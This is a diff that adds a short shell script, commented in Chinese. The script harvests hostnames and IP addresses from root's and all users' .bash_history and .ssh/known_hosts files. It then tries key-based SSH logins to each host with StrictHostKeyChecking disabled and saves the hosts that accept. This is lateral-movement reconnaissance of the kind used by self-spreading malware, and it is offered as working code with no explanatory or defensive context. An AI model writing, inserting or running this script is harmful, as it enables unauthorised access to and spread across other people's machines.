@@ -1,0 +1,12 @@
+#域名过滤
+cat /root/.bash_history /root/.ssh/known_hosts /home/*/.bash_history /home/*/.ssh/known_hosts 2>/dev/null | egrep -v 'http|gov|github|key|tar|qq.com|taobao|tmall|baidu|0.0.0.0|127.0.0.1|localhost' | grep -E -o "\b([A-Za-z0-9]+\.){1,3}[A-Za-z]{2,4}\b" | grep -E .*'com|cn|org|net|vip|art|xin|shop|ltd|wang|online|store|club|cc|beer|luxe|pro|ink|site|fun|tech|biz|info|group|design|link|work|mobi|ren|kim|pub|cn|name|tv|red|live|wiki|edu|top|win|int|mil|coop|aero|xxx|idv|me'$ | sort -u > domain.list
+
+#IP过滤
+cat /root/.bash_history /root/.ssh/known_hosts /home/*/.bash_history /home/*/.ssh/known_hosts 2>/dev/null | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | egrep -v '127.0.0.1|0.0.0.0' | sort -u > ip.list
+
+#验证程序
+rm -f success.list > /dev/null 2&>1
+for i in `cat /root/ip.list /root/domain.list`
+do
+  timeout 7s ssh -oStrictHostKeyChecking=no `whoami`@$i pwd > /dev/null 2&>1 && echo $i >> success.list
+done && rm -f ip.list domain.list
